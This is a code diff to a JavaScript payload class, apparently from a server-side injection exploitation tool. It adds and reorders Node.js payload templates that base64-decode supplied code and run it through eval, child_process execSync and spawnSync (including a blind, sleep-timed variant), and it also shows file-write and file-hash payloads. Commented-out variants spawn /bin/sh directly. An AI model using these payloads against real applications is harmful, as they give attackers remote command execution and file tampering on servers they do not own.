@@ -25,6 +25,25 @@ class Javascript_generic(javascript.Javascript):
                 # Just use the wrapped payload for eval
                 'wrapper_type': "global",
             },
+            'evaluate': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
+                'test_os': """global.process.mainModule.require('os').platform()"""
+                #'test_os': """process.platform"""
+            },
+            'execute': {
+                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
+                #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
+            },
+            'execute_boolean': {
+                'call': 'evaluate_blind',
+                # spawnSync() shell option has been introduced in node 5.7, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """global.process.mainModule.require('child_process').spawnSync(Buffer('{code_b64p}', 'base64').toString(), options={{shell:true}}).status===0"""
+            },
+            'execute_blind': {
+                'execute_blind': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
+                #'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
+            },
             'write': {
                 'write': """global.process.mainModule.require('fs').appendFileSync('{path}', Buffer('{chunk_b64p}', 'base64'), 'binary')""",
                 'truncate': """global.process.mainModule.require('fs').writeFileSync('{path}', '')"""
@@ -34,19 +53,6 @@ class Javascript_generic(javascript.Javascript):
             },
             'md5': {
                 'md5': """global.process.mainModule.require('crypto').createHash('md5').update(global.process.mainModule.require('fs').readFileSync('{path}')).digest("hex")"""
-            },
-            'evaluate': {
-                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())""",
-                'test_os': """global.process.mainModule.require('os').platform()"""
-                #'test_os': """process.platform"""
-            },
-            'execute_blind': {
-                'execute_blind': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}')"""
-                #'execute_blind': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString() + ' && sleep {delay}'], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
-            },
-            'execute': {
-                'execute': """global.process.mainModule.require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
-                #'execute': """<%x=process.binding("spawn_sync").spawn({{file:"/bin/sh", args: ["/bin/sh","-c",Buffer('{code_b64p}', 'base64').toString()], stdio: [{{type:"pipe", readable:1, writable:1 }},{{type:"pipe", readable:1, writable:1}}]}}).output[1]%>"""
             },
         })
 
